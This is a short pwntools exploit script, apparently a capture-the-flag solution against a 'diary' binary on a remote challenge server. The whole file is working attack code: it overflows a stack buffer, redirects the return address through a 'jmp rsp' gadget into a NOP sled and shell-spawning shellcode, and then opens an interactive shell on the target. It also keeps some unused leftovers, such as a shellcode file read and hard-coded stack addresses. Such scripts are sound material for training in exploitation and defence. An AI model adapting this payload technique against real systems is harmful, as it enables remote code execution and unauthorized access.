from pwn import *

context(arch = 'amd64', os = 'linux')

exe = context.binary = ELF('diary')

io = remote('challs.tfcctf.com', 30220) #exe.process()

with open('compiled.txt', 'rb') as f:
	shellcode = f.read()

# Adjust the size of NOP sled based on the size of shellcode
nop_sled = b'\x90' * 206
buffer_address = 0x007fffffffdda0
offset = 264
payload = fit({
    # jumps here second
    offset-8: asm('add rsp, 32; jmp rsp'),
   
    # jumps here first
    offset: exe.symbols['helper'],
   
    # jumps here third
    offset+8: b'\x90' * 100 + asm(shellcraft.sh())
})
#0x007ffe317262e0
#0x007ffe6d8f1128
#0x007ffd2e435cf0
#0x007ffcacd4cb80

# overwrite return address with address of shellcode

io.recvuntil(b'Dear diary...\n')
#gdb.attach(io)
io.sendline(payload)
io.interactive()